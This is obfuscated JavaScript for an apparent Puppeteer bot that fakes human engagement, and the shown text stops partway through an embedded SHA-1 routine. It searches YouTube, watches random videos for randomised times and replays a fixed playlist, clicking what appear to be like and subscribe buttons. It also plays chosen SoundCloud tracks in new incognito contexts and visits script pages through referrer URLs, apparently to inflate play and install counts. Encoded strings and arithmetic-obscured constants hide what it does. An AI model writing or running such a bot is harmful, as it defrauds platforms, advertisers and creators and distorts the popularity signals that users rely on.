const a0 = d,
  Z = c,
  Y = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x1d8e + 0x25f * -0x3 + -0x1670))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x5 * -0x226 + 0x54 * 0x73 + 0xaa * -0x49), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0xa * -0x13a + 0x1 * -0xc23 + 0x1867 * 0x1);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x2c32 * 0x4 + -0x5abe + 0x1f26 + (-0x9d * 0x40 + 0x1f91 * 0x1 + 0x4247) * random()) : await standardWaitForNetIdle(f), await wait(0x707 + 0x1 * -0x10d2 + -0x1 * -0x1d53 + (0x1aa9 + 0x10 * 0x3 + 0xc37) * random()), -0x1a14 + -0x1 * 0x41b + 0x1e30;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x46e + 0x144 + -0x19f * -0xe), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x17ff + -0xccb + 0x24cb;
}
async function randomWait() {
  return await wait(0x83 * -0x11 + -0x17ad + 0x19f4 * 0x2 + (0x1 * -0xd25 + -0xe5e * -0x1 + -0x6d * -0x2b) * random()), -0x1514 + 0x425 * -0x4 + -0x25a9 * -0x1;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0xda * 0x2d + -0x1949 + 0x3f9b, 0x18a2 + 0x2ae * -0x2 + 0x133f * -0x1), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x44ba + -0x1041 * -0x7 + 0x33df) * getRandomInt(-0x1b53 + 0x9b3 + -0x11a2 * -0x1, 0x23c3 + -0x3 * 0x4c + -0x22da), h)), 0x4f * -0x3c + -0x2 * -0xbb9 + -0x4ed;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x8b6 + -0x2542 + 0x4 * 0x723;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x4 * 0x785 + -0x7b * -0x25 + 0x276 * 0x5]['split']('\x20');
    for (let k = -0x1c01 + 0x2 * -0xaa9 + 0x3153; k < i['length']; k += 0xba7 + -0x73c * 0x5 + 0x3 * 0x82d)
      j += i[k] * h[i[k + (0x22a + 0x1f * -0x25 + 0x252)]];
    return j;
  });
}
async function anchorAndView(f) {
  const ai = {
      f: 0xe
    },
    R = c;
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + R(ai.f)), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f[R(0x3)](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x25fe + 0x21 * 0x11 + 0x23d3)['map'](l => Array['from'](l['children']))['flat'](0x2564 + -0x59 * 0x55 + -0x7d6)['map'](l => l['childNodes'][-0xad2 + -0x122d + 0x74 * 0x40]['childNodes'][0x209 * -0x2 + -0x26ec + 0x2afe]['childNodes'][0x182 * -0x4 + 0x164a + 0xdb * -0x13]['childNodes'][-0x1901 + -0x9c5 + 0x22c6 * 0x1]['childNodes'][-0x754 + 0x1 * 0x1389 + -0xc34]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x1b * 0xfd + 0x79e + 0x1 * 0x16f9, -0x559 + 0x1351 * -0x1 + 0x2c32)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x4c1 * 0x3 + 0x4133 + 0xa * 0xc4);
  const h = await getMaxTime(f),
    i = Math['min']((0x907a * -0x3 + 0x18c5d + 0x10f71) * getRandomInt(-0x26f * -0xb + -0x1d05 + 0x11 * 0x22, 0x1a06 + 0x53 * 0x6d + -0x3d58), h);
  return await wait(i), 0x1 * -0x30d + -0x39b * 0x8 + -0x6 * -0x551;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x25bd * 0x1 + -0x2 * -0x116d + 0x1 * -0x4897]['children'][-0x1b66 + -0x1242 + 0x2da8]['children'][-0x54e + 0x804 + 0x2 * -0x15b]['children'][-0x1 * -0x14c2 + -0x973 * 0x1 + -0x5 * 0x243]['children'][-0x1 * -0x1a97 + 0x76 * 0x49 + -0x3c3d]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x1 * 0x338 + -0x15 * 0x1a + -0x115;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x2 * 0x124 + -0xd0 + -0x114 + (-0x910 * -0x1 + -0x1 * -0x1fbb + -0x2899) * random()
  }), await wait(0xc77 * 0x1 + -0xe60 + 0x3dd + (-0x2 * 0xd21 + -0x19d8 + 0x6 * 0x8e1) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0xb3 * -0x14 + 0xb44 + 0x2ba]['childNodes'][-0x248 + 0x1cb1 + 0xd34 * -0x2]['childNodes'][0x2 * 0xb57 + -0x23fa + 0xd4d]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x2 * -0x7ad + -0xcf3 + -0x262]['childNodes'][0x2656 + 0x3a * 0x97 + 0x4 * -0x1223]['childNodes'][-0x32f * 0x7 + -0x299 * -0xd + -0xb7a]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        const S = d;
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))[S(0x13)](0x1 * -0x5b3 + 0x1 * -0x42d + 0x9e1),
          r = 0x223f + -0x4a * 0x5f + 0x243 * -0x3;
        for (let u = -0x1a97 + 0x165 * 0x7 + 0x167 * 0xc; u < q['length']; u += -0xddb + -0x17e2 + -0x3 * -0xc95)
          r += q[u] * k[q[u + (0x1fc9 + 0x119b * 0x1 + -0x1 * 0x3163)]];
        return r;
      }(n);
  });
  await wait((0xd * 0xa7 + -0x3a97 + 0x6cb4) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x75bd + -0x747a + 0xe91d) * getRandomInt(-0x2176 + 0x15 * -0xb9 + 0x30a4, 0x46 * -0x70 + -0x4 * 0x98d + -0x2b * -0x19a), h + (0x1ba + -0x18b9 * -0x1 + -0xb * 0xa1));
  return await wait(i), -0x1d0d * -0x1 + 0xd * -0x6d + -0x1783 * 0x1;
}
async function keyWatch(f) {
  const U = c,
    T = b;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x1 * -0xacf + 0x394 + 0xe63 * -0x1), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + T(0x8, 'lM84') + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + U(0x15) + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x2219 + 0x1 * 0x2149 + -0x322 * -0x4 + (0xa7a + -0x43d + -0x255) * Math['random']());
    });
  }, -0x1139 * 0x2 + 0x85c * 0x6 + -0x1 * -0xba2);
  await wait(-0x1 * 0x408ec + 0x4cc1d + -0x1 * -0x3d0af);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x11cb7 * -0x1 + -0x1508a + 0x1 * 0x11e33) * getRandomInt(-0xe18 + 0x490 + -0x5e * -0x1a, -0x1 * 0x256d + 0x2340 + 0x246)), clearInterval(h), -0x1353 + -0x2400 + 0x3754;
}

function a() {
  const br = [
    'random',
    'rMLYzwzVEa',
    'pts/454409',
    'zxzHBhvHDgu',
    'rg/en/scri',
    'juu5jueXjui1jq',
    'BMXVywrLCI1MBW',
    'emkuW7JcHCkvWPpdPMrkW7K',
    'EerSWOniW5dcL3eAW7K',
    'Ahr0Chm6lY9NCG',
    'm\x22;v=\x22',
    'easyfork.o',
    'WPJcHCo1WQT2W6WDoCkZ',
    'BgvUz3rO',
    'lwnOAwXKkdeP',
    'browser\x20la',
    'clipboard&',
    'lwfYy2HPDgvJDa',
    'applicatio',
    'flat',
    'W6VdJMxcQKpdUYNdHCk6WOa',
    'Dg9Uid4GExqTDa',
    'aq0Jh8oq',
    'WRNdR8oIySkXW5dcTSodWQ/cSa',
    'WPiVW5PDWOjbW5DQW5Og',
    'c8oR6z2L5zIP6kI4W4BcTxvsW6e',
    'BefeqKHezY1kDa',
    'C8oRWP7cLSoaW7m',
    '8.0.0.0\x20Sa'
  ];
  a = function() {
    return br;
  };
  return a();
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x1f7f + 0x1016 + 0xf69;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x1 * -0xcb5 + 0x2e3 * -0xb + -0x130d * -0x1;
    await randomWait();
  }
  return -0x13b4 + 0x6d7 + -0x3d * -0x36;
}

function fetchRandomSC() {
  const V = d;
  return Math['random']() <= 0x11e3 + -0x904 + -0x8df + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x25c4 + 0x23 * -0x1b + 0x2975 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + V(0x10) + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x1fbb * 0x1 + -0x2616 + -0x45d1 * -0x1 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x5 * 0x716 + -0x1fbe + -0x2196 * -0x2;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x2755 * -0x7 + 0x1 * -0x31c3 + -0x84c * 0x6 + getRandomInt(-0x5bc3 + 0x6b91 + 0x2aca, 0xa501 + -0x19ea + 0x3f * -0x59));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x1475 + 0xbd8 + 0x44f * 0x2), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x1cb3 + -0x131d + -0x9 * -0x550;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x604 + 0x36 * 0x1a + 0x1 * 0x88, 0x5e * -0x40 + 0x1b2 * 0x15 + -0xbe8)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x1 * -0x25f + 0x19 * -0x158 + 0x2bc7 + floor((0x14bd * 0x1 + -0xa60 + -0x675) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x958d2e * 0x4e + -0xf4ac1f3a + 0x1a23d233e),
          -0xce47ce + -0xa58635 * -0x1 + -0xb * -0xf576b,
          0x844d + 0x4a78 + -0x4ec5,
          0x1969 + 0x224e + -0x3b37
        ], y = [
          0x1 * 0x18b3 + 0x1796 + 0x49 * -0xa9,
          -0x95 * 0x16 + 0x1 * -0xaee + -0x5f3 * -0x4,
          -0x1b04 + -0x13d1 + 0x2edd,
          -0x15c6 + 0x26f8 + -0x1132
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x8f * 0x39 + -0x3 * 0x3ad + 0x1 * 0x2adf)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x21 * -0x29 + -0x11b5 + 0xc6c; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              const W = c;
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x1c99 * -0x1 + -0x49 + 0x1 * 0x1ce2) === N[W(0xd)])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              const X = b;
              J ? (A[-0x1f96 + 0x1 * -0x1ad7 + 0x3a6d] = A[-0x31e + -0x7e + -0xa * -0x5e] = A[0x7a5 * -0x5 + 0xd32 + -0x164 * -0x12] = A[0x1557 + 0x7d * 0x37 + 0x303 * -0x10] = A[0x2270 + 0x1cd1 + -0x1 * 0x3f3e] = A[0x557 * -0x5 + 0xf * 0x286 + -0x1 * 0xb23] = A[-0x1f18 + -0x6 * -0x27b + 0x103b] = A[0x200a + -0x2 * -0xed3 + -0x3daa] = A[0x134e + 0x14bb + -0x2802 * 0x1] = A[0x14d2 + 0x165 * -0x1 + -0x1365] = A[-0x1 * 0x1161 + -0x6a7 + 0x1811 * 0x1] = A[-0x26b6 + -0x234f + 0x4a0f] = A[0x9f8 + -0x1 * 0x15f1 + -0x4 * -0x301] = A[-0x13df * -0x1 + -0x61 * 0x3c + 0x2e9] = A[0x6b * -0x13 + -0xa * 0x14e + 0x150a] = A[0x26ed + 0x8d * -0x25 + -0x127e] = A[-0x91 * -0x43 + 0x22bd + -0x48a1 * 0x1] = 0x12cd * 0x2 + -0x1 * 0xdff + -0x179b, this['blocks'] = A) : this['blocks'] = [
                0xe0b + -0x45c + -0x1 * 0x9af,
                0x11 * -0x17d + 0xa1a + 0xf33,
                0x3 * -0x8c3 + 0x1 * -0x865 + 0x22ae,
                0x15ed + 0x1f2 + -0x17df,
                -0x17b5 + -0x1 * -0x13c2 + 0x3f3 * 0x1,
                -0x2 * 0xb3f + -0xf2e + 0x25ac,
                -0x131e + -0x2 * 0x134f + 0x39bc * 0x1,
                -0x242f + -0x1541 + 0x3970,
                -0x1 * 0x26a5 + 0x1012 + -0x1693 * -0x1,
                -0x104 + -0x129d + -0x13a1 * -0x1,
                0x1e57 + 0xb * 0x188 + -0x1 * 0x2f2f,
                0x3d * -0x77 + 0x2 * -0x10b9 + -0x1 * -0x3dcd,
                -0x1304 + -0x9e * 0x4 + -0x32 * -0x6e,
                -0x1bb4 + 0x1c34 + -0x80,
                0xb * -0x2c5 + 0x1f58 + -0xe1,
                -0xac8 + -0x1dbf + 0x2887,
                -0x1 * 0x793 + -0x17b + 0x90e
              ], this['h0'] = -0x8c233d86 + -0x2976f6a6 + 0x74dee8b * 0x27, this['h1'] = 0x860c4816 + -0x106 * -0x85a57e + -0x1f05fb81, this['h2'] = 0x3 * -0xea8ea75 + 0x37801525 + -0x387bcfb * -0x28, this['h3'] = 0x17cb4391 + -0x7 * -0x1998e47 + -0x12cbd30c, this['h4'] = 0x11896c06 * 0x15 + -0x10e494ad + -0x9b8e65e1, this[X(0x16, 'P$8]')] = this['start'] = this['bytes'] = this['hBytes'] = 0x1d * 0x18 + -0x3 * 0xc6f + 0x2295, this['finalized'] = this['hashed'] = -0x2013 + -0x23ac + 0x43bf, this['first'] = -0x22c7 + 0x6ca * -0x1 + 0x2992;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x542 + -0x73 * 0x15 + 0xeb1, O = J['length'] || -0x1 * 0x124e + 0x1 * 0x1da + 0x1074, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x1 * -0xdde + -0x9ce + -0x4 * 0x104, P[-0x1435 + 0x3 * -0x7af + -0xe2 * -0x31] = this['block'], P[0x2 * -0x162 + -0x2510 + 0x5c * 0x6f] = P[0x1a1d + 0x18b6 * 0x1 + -0xa2a * 0x5] = P[-0x3 * -0xcb1 + -0x3c9 + 0x1 * -0x2248] = P[0xd5e + 0xb * -0x349 + -0x48 * -0x51] = P[-0x26a3 + 0x76 * 0x8 + 0x22f7] = P[-0x19c5 + 0x1 * -0x701 + 0x49 * 0x73] = P[0x546 + -0x2303 * -0x1 + -0x1 * 0x2843] = P[0x38f + -0x176b + -0x1 * -0x13e3] = P[0x1f1a + -0x14b5 + 0xa5d * -0x1] = P[-0xb71 + 0x34 * 0x95 + -0x12ca] = P[0xd85 * -0x1 + -0x1c19 + 0x29a8] = P[-0x13 * -0x208 + -0x18a9 + -0xde4] = P[-0x38 + 0x244e + -0x1205 * 0x2] = P[-0x22 * -0xdd + 0x241b + -0x4168] = P[0x24f6 + 0x5b * 0xc + -0x292c] = P[-0x2290 + 0x2697 + -0x3f8] = 0x1251 + 0xca6 * 0x1 + -0x1ef7), K) {
                    for (N = this['start']; M < O && N < 0x18 * 0x89 + -0xdb9 + -0x121 * -0x1; ++M)
                      P[N >> -0x2b + -0x113 * 0x18 + -0x1 * -0x19f5] |= J[M] << y[-0x1b4d + 0x1 * -0x21d7 + 0x3d27 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x1959 + 0xdb2 + 0x1 * -0x26cb; ++M)
                      (L = J['charCodeAt'](M)) < 0x4 * 0x19f + -0x17a5 + -0x11a9 * -0x1 ? P[N >> 0xb * -0x2bb + -0x1 * 0x175d + 0x3568] |= L << y[-0x1ea7 * -0x1 + 0xdc1 + -0x2c65 * 0x1 & N++] : L < 0x1ce9 + -0xc4 * 0x14 + -0x599 * 0x1 ? (P[N >> -0x1ff0 + -0x98e + 0x2980] |= (-0x5 * 0x334 + -0x6ae + 0x1772 | L >> -0x25d + 0x2319 + -0x20b6) << y[-0x261c + -0x22d2 + -0x107 * -0x47 & N++], P[N >> -0x322 * 0x9 + 0x184a + -0x3 * -0x14e] |= (0x6b * -0x3d + 0x22b9 * -0x1 + 0xe8 * 0x43 | -0x2 * 0x16 + 0x1 * 0x1457 + -0x13ec & L) << y[0x1d3e * -0x1 + 0x25a + 0x47 * 0x61 & N++]) : L < -0x1928f + 0x5e * 0x443 + -0x15 * -0xa61 || L >= 0x1 * 0x18c5 + 0xd97e + -0x1243 ? (P[N >> -0x3b * -0x3d + -0x1 * -0x26da + -0x1 * 0x34e7] |= (0x5 * -0x420 + -0xf88 + 0x2508 | L >> 0x208 * -0x2 + -0x1 * 0x1e6d + 0x2289) << y[0x1 * 0x5c6 + -0x4 * 0x24d + 0x371 & N++], P[N >> 0x24a5 + -0x1f9a + 0x509 * -0x1] |= (0x1 * -0x2169 + -0x1147 + -0x38 * -0xea | L >> -0x62f + 0x74a + -0x1 * 0x115 & 0xd36 + 0x175e + 0x1 * -0x2455) << y[0x2484 + -0x4d4 + -0x3 * 0xa8f & N++], P[N >> -0x143f + -0x1f45 * 0x1 + -0x1 * -0x3386] |= (0x2ef + -0x12 * 0x21e + 0x23ad | 0x13 * -0xef + 0x81b * 0x2 + 0x1c6 & L) << y[-0x143 * 0x7 + -0x4cf + 0xda7 & N++]) : (L = -0x3a32 * -0x6 + -0x11ec4 * 0x1 + 0xc198 + ((-0x145e + 0x1 * 0x5b3 + 0x12aa & L) << 0xb34 + -0x28 * -0xc8 + 0x2a6a * -0x1 | 0x1 * -0x121d + 0xc * -0x20d + 0x2eb8 & J['charCodeAt'](++M)), P[N >> 0x160f + -0x5bd * -0x3 + -0x2744] |= (-0x1 * 0x1f31 + -0x1997 + 0x39b8 | L >> -0x25a1 + 0xbbe + -0x19f5 * -0x1) << y[0x7 * -0x556 + 0x2f * 0xb1 + 0x4de & N++], P[N >> 0x1feb * 0x1 + -0x230d + 0xc9 * 0x4] |= (-0x1bf2 * -0x1 + 0xf97 + -0x2b09 | L >> -0x1 * 0x702 + 0x1 * -0x21a4 + -0x1 * -0x28b2 & -0x1a2 * 0x7 + -0x56 * 0x67 + -0xf6d * -0x3) << y[-0x28 * 0xca + -0xfa8 + 0x1 * 0x2f3b & N++], P[N >> 0x1 * 0x12f6 + -0x1854 * 0x1 + -0x560 * -0x1] |= (-0x37d + -0x1fcb + 0x11e4 * 0x2 | L >> -0x5a3 + 0xbe9 + -0x640 & 0x1e4f + 0x1d * -0x7d + -0xb1 * 0x17) << y[-0x494 * 0x2 + 0xa1e + -0xf3 & N++], P[N >> 0x403 * 0x9 + 0xb * 0x106 + 0xfc9 * -0x3] |= (0x896 + -0xb3f + 0x329 | -0x1 * 0x1c76 + 0x92b * -0x1 + -0x3 * -0xca0 & L) << y[0x5 * 0x63d + 0xa6 * 0x1b + -0x30b0 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x135a + 0x1ed9 + -0x31f3 ? (this['block'] = P[0x26b0 + 0xa6 * -0x5 + -0x2362], this['start'] = N - (-0x967 * 0x3 + 0x1e8d + 0x86 * -0x4), this['hash'](), this['hashed'] = -0x227 + 0xfa6 + -0x6bf * 0x2) : this['start'] = N;
                }
                return this['bytes'] > 0x12bc5376b * 0x1 + 0x1681 * 0x144e83 + 0x1 * -0x1f4c0096f && (this['hBytes'] += this['bytes'] / (-0x15b8a374 + 0x19bca32d8 + -0x86118f64) << -0x1a5f + -0x11 * 0x31 + 0xed0 * 0x2, this['bytes'] = this['bytes'] % (-0x1d16591d0 + 0x5f63e2 * 0x100 + 0x27201afd0)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x2 * 0x18e + -0x25 * 0x83 + -0x14c * -0x11;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x12f * -0x3 + -0x252 + -0x12b] = this['block'], J[K >> -0x508 + -0x3a1 + 0x8ab] |= x[0x2e3 * -0x4 + 0x2 * 0x95f + -0x1 * 0x72f & K], this['block'] = J[0x12 * -0x2c + -0xba3 + 0xecb], K >= 0x1 * -0x173 + 0x5d * -0x17 + 0x503 * 0x2 && (this['hashed'] || this['hash'](), J[-0x737 * -0x2 + -0x264a + 0x17dc] = this['block'], J[-0x12c6 + 0x12da + -0x4] = J[-0x15ee + 0x19ac + -0x3bd] = J[0xcc * 0x1a + -0x26d4 + 0x121e] = J[-0x1cb5 + 0x219f + -0x5 * 0xfb] = J[0x1e14 + 0xf9b + -0x1b * 0x1b1] = J[0xdfb + -0x2 * 0x15d + -0x4 * 0x2cf] = J[-0x656 + -0xa84 * 0x2 + 0x1b64] = J[-0x1095 + 0x2094 + 0x8 * -0x1ff] = J[-0xe * -0x9 + -0x2 * 0xef6 + 0x1 * 0x1d76] = J[-0x1 * -0x7aa + 0xeab + -0x164c] = J[-0x1b56 + -0xe13 + 0x49b * 0x9] = J[0xd01 * -0x3 + 0xc50 + 0x1abe] = J[0x3a1 * 0x1 + -0x211 * -0xf + 0x2294 * -0x1] = J[-0x961 * -0x2 + -0x1745 + 0x1 * 0x490] = J[-0x3 * -0x3e1 + 0x1ce3 + 0xb9 * -0x38] = J[0xfae + 0x1b9f + -0x267 * 0x12] = 0x4 * -0x218 + -0x1422 + 0xb2 * 0x29), J[0x2464 + 0x4 * -0x806 + -0x43e] = this['hBytes'] << 0x1243 + 0x2b * 0x73 + -0x2591 | this['bytes'] >>> -0x37e + -0x21d3 + -0x2 * -0x12b7, J[0x830 * 0x1 + -0x2535 + -0x2 * -0xe8a] = this['bytes'] << -0x1d * -0x59 + 0x100b + -0x1a1d, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x217 * -0xb + -0x4be * -0x1 + -0x2b * -0x6d; J < 0x1d5d * -0x1 + 0x6 * -0x4f3 + -0x1 * -0x3b5f; ++J)
